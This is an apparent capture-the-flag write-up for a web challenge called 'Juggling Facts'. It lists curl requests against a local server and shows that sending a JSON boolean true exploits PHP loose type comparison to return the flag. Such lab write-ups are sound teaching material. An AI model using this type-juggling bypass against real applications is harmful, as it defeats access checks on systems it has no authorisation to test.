# Web 4 - Juggling Facts

```sh
# POST /getfacts {"type":"spooky"}
# try passing it garbage?

curl --stderr - -H "Content-Type: application/json" --request POST -d '{"type":"spooky"}' http://0.0.0.0:1337/api/getfacts | pup 'p text{}'

curl --stderr - -H "Content-Type: application/json" --request POST -d '{"type":"FAIL"}' http://0.0.0.0:1337/api/getfacts
# invalid type

# https://devansh.xyz/ctfs/2021/09/11/php-tricks.html
# https://ctf-wiki.mahaloz.re/web/php/php/#type-conversion
# type juggling; loose comparison?

curl --stderr - -H "Content-Type: application/json" --request POST -d '{"type":null}' http://0.0.0.0:1337/api/getfacts
# invalid type

curl --stderr - -H "Content-Type: application/json" --request POST -d '{"type":0}' http://0.0.0.0:1337/api/getfacts
# invalid type

curl --stderr - -H "Content-Type: application/json" --request POST -d '{"type":1}' http://0.0.0.0:1337/api/getfacts
# invalid type

curl --stderr - -H "Content-Type: application/json" --request POST -d '{"type":-1}' http://0.0.0.0:1337/api/getfacts
# invalid type

curl --stderr - -H "Content-Type: application/json" --request POST -d '{"type":false}' http://0.0.0.0:1337/api/getfacts
# invalid type

curl --stderr - -H "Content-Type: application/json" --request POST -d '{"type":true}' http://0.0.0.0:1337/api/getfacts 
# flag
```
